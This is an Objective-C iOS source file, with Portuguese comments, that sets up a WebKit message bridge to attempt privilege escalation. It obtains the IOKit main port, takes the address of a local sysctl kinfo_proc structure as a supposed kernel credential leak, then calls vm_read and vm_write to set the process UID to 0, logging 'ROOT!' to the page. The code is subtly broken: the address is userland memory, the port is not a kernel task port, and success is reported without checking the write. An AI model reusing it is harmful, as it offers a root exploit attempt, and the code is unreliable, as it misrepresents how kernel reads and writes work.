#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <stdint.h>
#include <mach/mach.h>
#include <dlfcn.h>
#include <sys/sysctl.h>
#include <unistd.h>

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, unsafe_unretained) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        
        [self.webView evaluateJavaScript:@"log('🧪 Localizando UID via Sysctl (A13)...')" completionHandler:nil];

        // 1. OBTER PORTA DE HARDWARE
        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
        typedef kern_return_t (*IOMainPortFunc)(mach_port_t, mach_port_t *);
        IOMainPortFunc get_main_port = (IOMainPortFunc)dlsym(iokit, "IOMainPort");
        mach_port_t mainPort = MACH_PORT_NULL;
        if (get_main_port) get_main_port(MACH_PORT_NULL, &mainPort);

        // 2. BUSCA DINÂMICA DO UID ATUAL
        int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
        struct kinfo_proc kp;
        size_t len = sizeof(kp);
        
        if (sysctl(mib, 4, &kp, &len, NULL, 0) == 0) {
            uid_t my_uid = kp.kp_eproc.e_ucred.cr_uid;
            
            // Usamos o endereço da struct kinfo como leak para testar o kread
            uint64_t leak_addr = (uint64_t)&kp.kp_eproc.e_ucred;

            NSString *logMsg = [NSString stringWithFormat:@"log('🔍 UID: %u | Leak Cred: 0x%llx')", my_uid, leak_addr];
            [self.webView evaluateJavaScript:logMsg completionHandler:nil];

            // 3. TESTE DE KREAD (Leitura Segura)
            vm_offset_t data;
            mach_msg_type_number_t sz = 4;
            kern_return_t kr = vm_read(mainPort, (vm_address_t)leak_addr, 4, &data, &sz);

            if (kr == KERN_SUCCESS) {
                [self.webView evaluateJavaScript:@"log('✅ <b>KREAD SUCESSO!</b> Porta ativa no Kernel.')" completionHandler:nil];
                
                // Se a leitura funcionou, agora o KWRITE para Root (UID 0) é possível
                uint32_t root_val = 0;
                vm_write(mainPort, (vm_address_t)leak_addr, (vm_offset_t)&root_val, 4);
                [self.webView evaluateJavaScript:@"log('👑 <b>ROOT!</b> UID alterado para 0.')" completionHandler:nil];
            } else {
                [self.webView evaluateJavaScript:@"log('❌ KREAD Negado: Sandbox ainda bloqueia a MainPort.')" completionHandler:nil];
            }
        }
        if (iokit) dlclose(iokit);
    }
}
@end
